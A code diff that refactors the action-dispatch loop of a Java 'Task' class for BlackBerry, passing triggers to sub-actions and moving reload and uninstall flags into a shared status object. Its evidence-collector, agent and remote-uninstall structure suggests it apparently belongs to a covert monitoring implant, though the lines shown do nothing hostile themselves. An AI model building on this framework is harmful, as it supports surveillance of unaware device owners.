@@ -25,7 +25,6 @@ import blackberry.evidence.EvidenceCollector;
 import blackberry.interfaces.Singleton;
 import blackberry.utils.BlockingQueueTrigger;
 import blackberry.utils.Check;
-import blackberry.utils.Utils;
 
 /**
  * The Class Task.
@@ -250,7 +249,7 @@ public final class Task implements Singleton {
                 //#ifdef DEBUG
                 debug.trace("checkActions executing action: " + actionId);
                 //#endif
-                int exitValue = executeAction(action);
+                int exitValue = executeAction(action, trigger);
 
                 if (exitValue == Exit.UNINSTALL) {
                     //#ifdef DEBUG
@@ -284,7 +283,7 @@ public final class Task implements Singleton {
         }
     }
 
-    private int executeAction(final Action action) {
+    private int executeAction(final Action action, Trigger trigger) {
         int exit = 0;
         //#ifdef DEBUG
         debug.trace("CheckActions() triggered: " + action);
@@ -294,7 +293,7 @@ public final class Task implements Singleton {
         //action.setTriggered(false, null);
 
         status.synced = false;
-        final Vector subActions = action.getSubActionsList();
+        final Vector subActions = action.getSubActions();
         final int ssize = subActions.size();
 
         //#ifdef DEBUG
@@ -322,10 +321,9 @@ public final class Task implements Singleton {
                 //#endif
 
                 // no callingEvent
-                subAction.prepareExecute(null);
-                subAction.run();
+                final boolean ret = subAction.execute(trigger);
 
-                if (subAction.wantUninstall()) {
+                if (status.uninstall) {
                     //#ifdef DEBUG
                     debug.warn("CheckActions() uninstalling");
                     //#endif
@@ -335,27 +333,23 @@ public final class Task implements Singleton {
                     //return false;
                 }
 
-                if (subAction.wantReload()) {
+                if (status.reload) {
                     //#ifdef DEBUG
                     debug.warn("checkActions: reloading");
                     //#endif
-                    status.unTriggerAll();
-                    //#ifdef DEBUG
-                    debug.trace("checkActions: stopping agents");
-                    //#endif
-                    agentManager.stopAll();
-                    //#ifdef DEBUG
-                    debug.trace("checkActions: stopping events");
-                    //#endif
-                    eventManager.stopAll();
-                    Utils.sleep(2000);
-                    //#ifdef DEBUG
-                    debug.trace("checkActions: untrigger all");
-                    //#endif
-                    status.unTriggerAll();
+                   
                     //return true;
                     exit = Exit.RELOAD;
+                    status.reload = false;
                     break;
+                }
+                
+                if (ret == false) {
+                    //#ifdef DEBUG
+                    debug.trace("executeAction Warn: " + "CheckActions() error executing: " + subAction);
+                    //#endif
+
+                    continue;
                 }
 
             } catch (final Exception ex) {
